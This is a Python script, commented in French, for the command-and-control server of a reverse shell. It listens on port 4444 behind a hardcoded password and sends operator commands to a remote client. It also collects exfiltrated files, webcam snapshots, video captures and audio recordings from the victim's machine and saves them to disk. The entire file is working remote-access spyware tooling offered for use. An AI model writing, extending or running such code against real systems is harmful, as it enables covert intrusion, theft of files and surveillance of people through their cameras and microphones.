
# === Reverse Shell Server ===
# 📡 Reçoit les connexions du client.py, avec mot de passe

import socket, threading, base64

HOST = '0.0.0.0'
PORT = 4444
PASSWORD = 'Samglish'

def handle_client(conn, addr):
    print(f"[+] Connexion de {addr}")
    conn.send(b"Enter password:")
    auth = conn.recv(1024).decode().strip()
    if auth != PASSWORD:
        conn.send(b"Wrong password. Bye.")
        conn.close()
        return
    conn.send(b"[+] Authenticated.")

    while True:
        try:
            cmd = input(">> ").strip()
            if not cmd:
                continue
            conn.send(cmd.encode())
            if cmd == "exit":
                break
            elif cmd.startswith("download") or cmd in ["webcam_snap", "video_capture", "record_audio"]:
                data = b""
                while True:
                    part = conn.recv(4096)
                    if not part:
                        break
                    data += part
                    if len(part) < 4096:
                        break
                filename = "output_" + cmd.replace(" ", "_") + ".bin"
                with open(filename, "wb") as f:
                    f.write(base64.b64decode(data))
                print(f"[+] Fichier reçu : {filename}")
            else:
                response = conn.recv(4096).decode(errors="ignore")
                print(response)
        except Exception as e:
            print(f"[!] Erreur : {e}")
            break
    conn.close()

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[+] En écoute sur {HOST}:{PORT} ...")
        while True:
            conn, addr = s.accept()
            thread = threading.Thread(target=handle_client, args=(conn, addr))
            thread.start()

if __name__ == "__main__":
    start_server()
